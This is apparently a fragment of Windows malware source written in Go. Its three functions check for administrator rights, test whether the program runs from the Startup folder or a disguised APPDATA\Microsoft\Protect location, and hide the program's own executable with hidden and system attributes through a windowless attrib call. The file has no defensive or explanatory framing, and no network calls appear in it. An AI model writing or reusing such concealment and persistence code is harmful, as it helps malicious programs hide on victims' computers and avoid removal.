package program

import (
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

func IsElevated() bool {
	ret, _, _ := syscall.NewLazyDLL("shell32.dll").NewProc("IsUserAnAdmin").Call()
	return ret != 0
}

func IsInStartupPath() bool {
	exePath, err := os.Executable()
	if err != nil {
		return false
	}
	exePath = filepath.Dir(exePath)

	if exePath == "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" {
		return true
	}

	if exePath == filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Protect") {
		return true
	}

	return false
}

func HideSelf() {
	exe, err := os.Executable()
	if err != nil {
		return
	}

	cmd := exec.Command("attrib", "+h", "+s", exe)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	cmd.Run()
}